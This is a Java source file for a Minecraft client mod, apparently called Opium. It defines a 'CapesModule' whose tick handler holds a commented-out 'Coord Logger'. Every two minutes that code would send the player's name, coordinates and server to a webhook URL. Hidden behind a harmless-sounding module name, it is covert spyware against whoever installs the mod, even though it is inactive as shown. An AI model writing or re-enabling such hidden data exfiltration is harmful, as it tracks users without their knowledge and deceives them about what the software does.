package org.nrnr.opium.impl.module.client;

import org.nrnr.opium.api.event.listener.EventListener;
import org.nrnr.opium.api.module.ModuleCategory;
import org.nrnr.opium.api.module.ToggleModule;
import org.nrnr.opium.impl.event.TickEvent;

/**
 * @author ChronosUser
 * @since 1.0
 */
public final class CapesModule extends ToggleModule {
    private long lastPlaceTime = 0;
    public CapesModule() {
        super("Opium", "Opium", ModuleCategory.CLIENT);
    }

    @EventListener
    public void onTick(TickEvent event) throws InterruptedException {
        /*long time = System.currentTimeMillis();
        if ((time - lastPlaceTime) < 120000) return;
        lastPlaceTime = time;

        assert mc.player != null;
        Vec3d coords = mc.player.getPos();
        String serverip = null;
        if (!mc.isInSingleplayer()) {
            serverip = String.valueOf(mc.player.getServer());
        }

        String messageContent = "`Coord Logger | User: ` `" + mc.player.getDisplayName() + "` |  `Coords:` " + "` " + mc.player.getPos() + " Server: " + mc.getServer() + "`";
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            conn.setDoOutput(true);
            String jsonPayload = "{\"content\": \"" + messageContent + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int responseCode = conn.getResponseCode();
            System.out.println("Webhook sent: " + responseCode);

            conn.disconnect();


        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }

}
